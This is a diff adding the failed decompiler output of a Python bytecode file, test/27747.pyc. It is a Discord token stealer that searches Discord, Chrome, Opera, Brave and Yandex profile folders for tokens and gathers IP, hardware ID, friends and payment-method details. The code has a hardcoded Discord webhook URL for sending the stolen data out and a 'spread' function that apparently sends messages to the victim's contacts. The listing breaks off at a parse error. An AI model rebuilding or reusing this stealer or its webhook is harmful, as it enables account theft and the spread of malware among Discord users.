@@ -1,0 +1,300 @@
+
+# file test/27747.pyc
+# --- This code section failed: ---
+
+ L.   1         0  LOAD_CONST               0
+                2  LOAD_CONST               None
+                4  IMPORT_NAME              os
+                6  STORE_NAME               os
+
+ L.   2         8  LOAD_CONST               0
+               10  LOAD_CONST               None
+               12  IMPORT_NAME              re
+               14  STORE_NAME               re
+
+ L.   3        16  LOAD_CONST               0
+               18  LOAD_CONST               None
+               20  IMPORT_NAME              json
+               22  STORE_NAME               json
+
+ L.   5        24  LOAD_CONST               0
+               26  LOAD_CONST               ('Request', 'urlopen')
+               28  IMPORT_NAME_ATTR         urllib.request
+               30  IMPORT_FROM              Request
+               32  STORE_NAME               Request
+               34  IMPORT_FROM              urlopen
+               36  STORE_NAME               urlopen
+               38  POP_TOP          
+
+ L.   8        40  LOAD_STR                 'https://discord.com/api/webhooks/842277337738641408/-Chds6svD3kgkjTjAVFnvlyS3OE-auL6LHtQGeWJbNMenCLoxHkFWQswfDOAFeZcOye3'
+               42  STORE_NAME               WEBHOOK_URL
+
+ L.  11        44  LOAD_CONST               True
+               46  STORE_NAME               PING_ME
+
+ L.  13        48  LOAD_CODE                <code_object find_tokens>
+               50  LOAD_STR                 'find_tokens'
+               52  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+               54  STORE_NAME               find_tokens
+
+ L.  28        56  LOAD_CODE                <code_object main>
+               58  LOAD_STR                 'main'
+               60  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+               62  STORE_NAME               main
+
+ L.  73        64  LOAD_NAME                __name__
+               66  LOAD_STR                 '__main__'
+               68  COMPARE_OP               ==
+               70  POP_JUMP_IF_FALSE    86  'to 86'
+
+ L.  74        72  LOAD_NAME                main
+               74  CALL_FUNCTION_0       0  ''
+               76  POP_TOP          
+
+ L.  76        78  LOAD_CONST               0
+               80  LOAD_CONST               None
+               82  IMPORT_NAME              os
+               84  STORE_NAME               os
+             86_0  COME_FROM            70  '70'
+
+ L.  77        86  LOAD_NAME                os
+               88  LOAD_ATTR                name
+               90  LOAD_STR                 'nt'
+               92  COMPARE_OP               !=
+               94  POP_JUMP_IF_FALSE   102  'to 102'
+
+ L.  78        96  LOAD_NAME                exit
+               98  CALL_FUNCTION_0       0  ''
+              100  POP_TOP          
+            102_0  COME_FROM            94  '94'
+
+ L.  79       102  LOAD_CONST               0
+              104  LOAD_CONST               ('findall',)
+              106  IMPORT_NAME              re
+              108  IMPORT_FROM              findall
+              110  STORE_NAME               findall
+              112  POP_TOP          
+
+ L.  80       114  LOAD_CONST               0
+              116  LOAD_CONST               ('loads', 'dumps')
+              118  IMPORT_NAME              json
+              120  IMPORT_FROM              loads
+              122  STORE_NAME               loads
+              124  IMPORT_FROM              dumps
+              126  STORE_NAME               dumps
+              128  POP_TOP          
+
+ L.  81       130  LOAD_CONST               0
+              132  LOAD_CONST               ('b64decode',)
+              134  IMPORT_NAME              base64
+              136  IMPORT_FROM              b64decode
+              138  STORE_NAME               b64decode
+              140  POP_TOP          
+
+ L.  82       142  LOAD_CONST               0
+              144  LOAD_CONST               ('Popen', 'PIPE')
+              146  IMPORT_NAME              subprocess
+              148  IMPORT_FROM              Popen
+              150  STORE_NAME               Popen
+              152  IMPORT_FROM              PIPE
+              154  STORE_NAME               PIPE
+              156  POP_TOP          
+
+ L.  83       158  LOAD_CONST               0
+              160  LOAD_CONST               ('Request', 'urlopen')
+              162  IMPORT_NAME_ATTR         urllib.request
+              164  IMPORT_FROM              Request
+              166  STORE_NAME               Request
+              168  IMPORT_FROM              urlopen
+              170  STORE_NAME               urlopen
+              172  POP_TOP          
+
+ L.  84       174  LOAD_CONST               0
+              176  LOAD_CONST               ('datetime',)
+              178  IMPORT_NAME              datetime
+              180  IMPORT_FROM              datetime
+              182  STORE_NAME               datetime
+              184  POP_TOP          
+
+ L.  85       186  LOAD_CONST               0
+              188  LOAD_CONST               ('Thread',)
+              190  IMPORT_NAME              threading
+              192  IMPORT_FROM              Thread
+              194  STORE_NAME               Thread
+              196  POP_TOP          
+
+ L.  86       198  LOAD_CONST               0
+              200  LOAD_CONST               ('sleep',)
+              202  IMPORT_NAME              time
+              204  IMPORT_FROM              sleep
+              206  STORE_NAME               sleep
+              208  POP_TOP          
+
+ L.  87       210  LOAD_CONST               0
+              212  LOAD_CONST               ('argv',)
+              214  IMPORT_NAME              sys
+              216  IMPORT_FROM              argv
+              218  STORE_NAME               argv
+              220  POP_TOP          
+
+ L.  88       222  LOAD_NAME                os
+              224  LOAD_METHOD              getenv
+              226  LOAD_STR                 'LOCALAPPDATA'
+              228  CALL_METHOD_1         1  ''
+              230  STORE_NAME               LOCAL
+
+ L.  89       232  LOAD_NAME                os
+              234  LOAD_METHOD              getenv
+              236  LOAD_STR                 'APPDATA'
+              238  CALL_METHOD_1         1  ''
+              240  STORE_NAME               ROAMING
+
+ L.  91       242  LOAD_NAME                ROAMING
+              244  LOAD_STR                 '\\Discord'
+              246  BINARY_ADD       
+
+ L.  92       248  LOAD_NAME                ROAMING
+              250  LOAD_STR                 '\\discordcanary'
+              252  BINARY_ADD       
+
+ L.  93       254  LOAD_NAME                ROAMING
+              256  LOAD_STR                 '\\discordptb'
+              258  BINARY_ADD       
+
+ L.  94       260  LOAD_NAME                LOCAL
+              262  LOAD_STR                 '\\Google\\Chrome\\User Data\\Default'
+              264  BINARY_ADD       
+
+ L.  95       266  LOAD_NAME                ROAMING
+              268  LOAD_STR                 '\\Opera Software\\Opera Stable'
+              270  BINARY_ADD       
+
+ L.  96       272  LOAD_NAME                LOCAL
+              274  LOAD_STR                 '\\BraveSoftware\\Brave-Browser\\User Data\\Default'
+              276  BINARY_ADD       
+
+ L.  97       278  LOAD_NAME                LOCAL
+              280  LOAD_STR                 '\\Yandex\\YandexBrowser\\User Data\\Default'
+              282  BINARY_ADD       
+
+ L.  90       284  LOAD_CONST               ('Discord', 'Discord Canary', 'Discord PTB', 'Google Chrome', 'Opera', 'Brave', 'Yandex')
+              286  BUILD_CONST_KEY_MAP_7     7 
+              288  STORE_NAME               PATHS
+
+ L.  99       290  LOAD_CONST               (None, 'application/json')
+              292  LOAD_CODE                <code_object getheaders>
+              294  LOAD_STR                 'getheaders'
+              296  MAKE_FUNCTION_1          'default'
+              298  STORE_NAME               getheaders
+
+ L. 107       300  LOAD_CODE                <code_object getuserdata>
+              302  LOAD_STR                 'getuserdata'
+              304  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              306  STORE_NAME               getuserdata
+
+ L. 112       308  LOAD_CODE                <code_object gettokens>
+              310  LOAD_STR                 'gettokens'
+              312  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              314  STORE_NAME               gettokens
+
+ L. 123       316  LOAD_CODE                <code_object getdeveloper>
+              318  LOAD_STR                 'getdeveloper'
+              320  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              322  STORE_NAME               getdeveloper
+
+ L. 130       324  LOAD_CODE                <code_object getip>
+              326  LOAD_STR                 'getip'
+              328  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              330  STORE_NAME               getip
+
+ L. 137       332  LOAD_CODE                <code_object getavatar>
+              334  LOAD_STR                 'getavatar'
+              336  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              338  STORE_NAME               getavatar
+
+ L. 144       340  LOAD_CODE                <code_object gethwid>
+              342  LOAD_STR                 'gethwid'
+              344  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              346  STORE_NAME               gethwid
+
+ L. 147       348  LOAD_CODE                <code_object getfriends>
+              350  LOAD_STR                 'getfriends'
+              352  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              354  STORE_NAME               getfriends
+
+ L. 152       356  LOAD_CODE                <code_object getchat>
+              358  LOAD_STR                 'getchat'
+              360  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              362  STORE_NAME               getchat
+
+ L. 157       364  LOAD_CODE                <code_object has_payment_methods>
+              366  LOAD_STR                 'has_payment_methods'
+              368  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              370  STORE_NAME               has_payment_methods
+
+ L. 162       372  LOAD_CODE                <code_object send_message>
+              374  LOAD_STR                 'send_message'
+              376  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              378  STORE_NAME               send_message
+
+ L. 167       380  LOAD_CODE                <code_object spread>
+              382  LOAD_STR                 'spread'
+              384  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              386  STORE_NAME               spread
+
+ L. 176       388  LOAD_CODE                <code_object main>
+              390  LOAD_STR                 'main'
+              392  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              394  STORE_NAME               main
+
+ L. 268       396  SETUP_FINALLY       408  'to 408'
+
+ L. 269       398  LOAD_NAME                main
+              400  CALL_FUNCTION_0       0  ''
+              402  POP_TOP          
+              404  POP_BLOCK        
+              406  JUMP_FORWARD        454  'to 454'
+            408_0  COME_FROM_FINALLY   396  '396'
+
+ L. 270       408  DUP_TOP          
+              410  LOAD_NAME                Exception
+          412_414  <121>               452  ''
+              416  POP_TOP          
+              418  STORE_NAME               e
+              420  POP_TOP          
+              422  SETUP_FINALLY       444  'to 444'
+
+ L. 271       424  LOAD_NAME                print
+              426  LOAD_NAME                e
+              428  CALL_FUNCTION_1       1  ''
+              430  POP_TOP          
+
+ L. 272       432  POP_BLOCK        
+              434  POP_EXCEPT       
+              436  LOAD_CONST               None
+              438  STORE_NAME               e
+              440  DELETE_NAME              e
+              442  JUMP_FORWARD        454  'to 454'
+            444_0  COME_FROM_FINALLY   422  '422'
+              444  LOAD_CONST               None
+              446  STORE_NAME               e
+              448  DELETE_NAME              e
+              450  <48>             
+              452  <48>             
+            454_0  COME_FROM           442  '442'
+            454_1  COME_FROM           406  '406'
+
+Parse error at or near `<121>' instruction at offset 412_414
+
+Instruction context:
+   
+ L. 270       408  DUP_TOP          
+                 410  LOAD_NAME                Exception
+->           412_414  <121>               452  ''
+                 416  POP_TOP          
+                 418  STORE_NAME               e
+                 420  POP_TOP          
+                 422  SETUP_FINALLY       444  'to 444'
+
+test/27747.pyc -- 
+# decompile failed
